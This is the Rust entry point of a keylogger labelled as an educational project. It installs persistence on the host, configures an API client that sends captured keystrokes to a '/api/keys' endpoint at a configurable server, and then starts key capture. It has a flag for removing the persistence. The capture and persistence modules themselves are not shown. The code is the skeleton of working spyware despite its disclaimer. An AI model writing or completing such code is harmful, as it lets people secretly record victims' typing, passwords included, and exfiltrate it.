// src/main.rs
mod api;
mod keylogger;
mod persistence;

use api::{ApiClient, ApiConfig};
use std::sync::Arc;
use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔐 PROYECTO EDUCATIVO - KEYLOGGER EN RUST");
    println!("⚠️  Este software es SOLO para fines educativos");
    println!("{}", "=".repeat(50));

    // === PROCESAR ARGUMENTOS DE LÍNEA DE COMANDOS ===
    let args: Vec<String> = env::args().collect();

    if args.len() > 1 {
        match args[1].as_str() {
            "--remove-persistence" | "-r" => {
                println!("\n🗑️  Removiendo persistencia...");
                match persistence::remover_persistencia() {
                    Ok(_) => println!("✅ Persistencia removida exitosamente"),
                    Err(e) => eprintln!("❌ Error removiendo persistencia: {}", e),
                }
                return Ok(());
            }
            "--help" | "-h" => {
                println!("Uso: keylogger [OPCIONES]");
                println!("Opciones:");
                println!("  --remove-persistence, -r  Remover persistencia del sistema");
                println!("  --help, -h               Mostrar esta ayuda");
                return Ok(());
            }
            _ => {
                println!("⚠️  Argumento desconocido: {}", args[1]);
                println!("Usa --help para ver las opciones disponibles");
            }
        }
    }

    // === 1. CONFIGURAR PERSISTENCIA ===
    println!("\n📌 Configurando persistencia...");
    if !persistence::verificar_persistencia() {
        match persistence::instalar_persistencia() {
            Ok(_) => println!("✅ Persistencia instalada correctamente"),
            Err(e) => eprintln!("⚠️ No se pudo instalar persistencia: {}", e),
        }
    } else {
        println!("✅ Persistencia ya está instalada");
        println!("   (Usa --remove-persistence para desinstalar)");
    }

    // === 2. CONFIGURAR CLIENTE API ===
    println!("\n🌐 Configurando cliente API...");

    // Puedes cambiar la URL base desde variable de entorno o argumento
    let base_url = env::var("API_URL")
        .unwrap_or_else(|_| "http://localhost:8080".to_string());

    let api_config = ApiConfig {
        base_url,
        endpoint: "/api/keys".to_string(),
        api_key: Some("tu-api-key-aqui".to_string()),
        timeout_seconds: 30,
    };

    let api_client = Arc::new(ApiClient::new(api_config));

    // Verificar que la API está disponible
    match api_client.health_check() {
        Ok(true) => println!("✅ API disponible y funcionando"),
        Ok(false) => eprintln!("⚠️ API no disponible (health check falló)"),
        Err(e) => eprintln!("⚠️ Error conectando a la API: {}", e),
    }

    // === 3. INICIAR KEYLOGGER ===
    println!("\n⌨️  Iniciando keylogger...");
    println!("📝 Presiona ESC para salir\n");

    // Iniciar el keylogger
    keylogger::iniciar_keylogger(api_client)?;

    Ok(())
}
